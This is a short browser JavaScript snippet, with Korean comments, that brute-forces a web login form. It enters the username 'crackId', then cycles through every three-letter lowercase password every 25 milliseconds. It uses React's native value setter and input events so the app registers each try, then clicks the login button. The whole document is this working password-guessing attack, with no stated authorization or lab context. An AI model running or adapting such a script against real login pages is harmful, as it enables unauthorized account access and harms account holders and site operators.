// 테스트 배열 생성
const chars = 'abcdefghijklmnopqrstuvwxyz';
// const values = ["zxcv", "asdf", "qwer"];
let values = "";

// 두 번째 input 요소 선택
const input = document.querySelectorAll('input');

// 배열 인덱스를 위한 변수
let i,j,k;

// 배열의 값을 1초마다 순환하면서 input 요소의 값을 변경
let interval = null;

//id 입력
  const idSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  idSet.call(input[0], "crackId");

  // React의 onChange 이벤트를 트리거하여 상태를 업데이트
  const idEvent = new Event('input', { bubbles: true });
  input[0].dispatchEvent(idEvent);

const btn = document.getElementsByTagName("button")[0];
// zmfor code

i = 0;
j = 0;
k = 0;

if(interval){
  clearInterval(interval);
}
interval = setInterval(() => {
  values = chars[k]+chars[j]+chars[i];
  // 배열의 현재 값을 input에 설정
  const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  nativeInputValueSetter.call(input[1], values);

  // React의 onChange 이벤트를 트리거하여 상태를 업데이트
  const event = new Event('input', { bubbles: true });
  input[1].dispatchEvent(event);

  // 인덱스 값 업데이트
  if(i<25){
    i++;
  }
  else if(j<25){
    j++;
    i = 0;
  }
  else if(k<25){
    k++;
    j = i = 0;
  }
  else{
    console.log("crack fail");
    clearInterval()
  }
  btn.click();
}, 25);


// clearInterval(interval);
